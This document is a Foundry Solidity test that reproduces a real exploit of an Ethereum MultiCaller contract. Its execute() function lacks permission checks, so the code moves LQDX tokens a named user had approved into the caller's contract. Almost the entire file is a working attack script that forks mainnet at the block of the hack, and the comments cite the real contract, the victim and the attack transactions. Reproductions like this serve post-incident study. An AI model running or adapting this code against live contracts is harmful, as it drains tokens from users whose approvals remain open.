// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;
import {Test, console2} from "forge-std/Test.sol";

/*
Analysis: 
Improper permissions on MultiCaller contract: 
https://etherscan.io/address/0x1cfc7ee9f50c651759a1effcd058d84f42e26967#code

Allows anyone to call execute() with encoded transferFrom() ERC20 tokens that have approved the 
multicaller contract previously.

The hack demonstrated here targets LQDX tokens approved for the multicaller contract by the
0x7Dd37f2643B6Df0B489d034ce39EC25f4131da76 user.

forge test --fork-url $RPC_URL --fork-block-number 18890497 --via-ir --match-path test/MultilCaller.sol  -vv
*/

contract MultilCallerExploit is Test{
    address public multicaller = 0x1Cfc7EE9f50C651759a1EfFCd058D84F42E26967;
    address public lqdx = 0x872952d3c1Caf944852c5ADDa65633F1Ef218A26;

    address public target_user = 0x7Dd37f2643B6Df0B489d034ce39EC25f4131da76;

    /*
    target_user 0x7Dd37 approved the multicaller contract at this tx for unlimited LQDX
    https://etherscan.io/tx/0xa8e94c788ab8c02424f39d2d962d4fa513b0dbb1f40ab86198d2c64061a7f1cb
    Block 18889429

    hacker calls the multicaller contract to transferFrom LQDX from target_user to hacker at
    https://etherscan.io/tx/0x2fcef02ffcebd7707a81fedeed99f16fa99e7f0bcce3dadda823fe9dddebcb34
    Block 18890498

    target_user 0x7Dd37 removes the approval for the multicaller contract at this tx
    https://etherscan.io/tx/0xe746b750ee921b89f92ff8b69f88c911717b8479b3cd314ce3a8ebeadd43b76d
    Block 18891119
    */

    function testExploit() public {
        (bool success, bytes memory data) = lqdx.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 balance = abi.decode(data, (uint256));
        console2.log("Starting LQDX Balance: %s", balance);

        // check allowance of multicaller
        (success, data) = lqdx.call(abi.encodeWithSignature("allowance(address,address)", target_user, multicaller));
        uint256 allowance = abi.decode(data, (uint256));
        console2.log("Allowance: %s", allowance);

        bytes memory transfer_1 = abi.encodeWithSignature("transferFrom(address,address,uint256)", target_user, address(this), 793180335459547938383792);
        bytes memory transfer_2 = abi.encodeWithSignature("transferFrom(address,address,uint256)", target_user, address(this), 0);

        // Token Param - ensure its encoded as an array
        address[] memory token = new address[](1);
        token[0] = lqdx;

        // Amounts Param - ensure its encoded as an array
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 0;

        (success, data) = multicaller.call(
            abi.encodeWithSignature(
                "execute(address[2],bytes[2],address[],uint256[])", 
                [lqdx, lqdx], 
                [transfer_1, transfer_2], 
                token, 
                amounts
            ));

        (success, data) = lqdx.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        balance = abi.decode(data, (uint256));
        console2.log("Ending LQDX Balance: %s", balance);
    }
}